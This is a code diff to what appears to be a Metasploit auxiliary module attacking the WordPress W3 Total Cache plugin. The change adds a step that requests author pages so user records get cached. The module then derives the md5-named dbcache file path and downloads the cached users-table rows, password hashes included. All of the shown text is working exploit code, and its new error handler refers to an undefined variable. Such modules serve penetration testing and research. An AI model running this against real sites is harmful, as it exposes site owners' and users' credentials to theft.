@@ -45,6 +45,26 @@ class Metasploit3 < Msf::Auxiliary
 				], self.class)
 	end
 
+	def wordpress_url
+		url = datastore["URL"]
+		url << "/" if url[-1,1] != "/"
+		url
+	end
+
+	# Call the User site, so the db statement will be cached
+	def cache_user_info(user_id)
+		user_url = normalize_uri("/#{wordpress_url}?author=#{user_id}")
+		begin
+			send_request_cgi({ "uri" => user_url, "method" => "GET" })
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			vprint_error("Unable to connect to #{url}")
+			return nil
+		rescue ::Timeout::Error, ::Errno::EPIPE
+			vprint_error("Unable to connect to #{url}")
+			return nil
+		end
+	end
+
 	def run_host(ip)
 
 		users_found = false
@@ -53,14 +73,15 @@ class Metasploit3 < Msf::Auxiliary
 			vprint_status("Trying site_id #{site_id}...")
 			for user_id in 1..datastore["USER_ITERATIONS"] do
 				vprint_status("Trying user_id #{user_id}...")
+				# used to cache the statement
+				cache_user_info(user_id)
 				query="SELECT * FROM #{datastore["TABLE_PREFIX"]}users WHERE ID = '#{user_id}'"
 				query_md5 = ::Rex::Text.md5(query)
 				host = datastore["VHOST"] || ip
 				key="w3tc_#{host}_#{site_id}_sql_#{query_md5}"
 				key_md5 = ::Rex::Text.md5(key)
 				hash_path = "/#{key_md5[0,1]}/#{key_md5[1,1]}/#{key_md5[2,1]}/#{key_md5}"
-				url="/#{datastore["URL"]}/#{datastore["WP_CONTENT_DIR"]}/w3tc/dbcache#{hash_path}"
-				url = normalize_uri(url)
+				url = normalize_uri("/#{wordpress_url}#{datastore["WP_CONTENT_DIR"]}/w3tc/dbcache#{hash_path}")
 
 				result = nil
 				begin
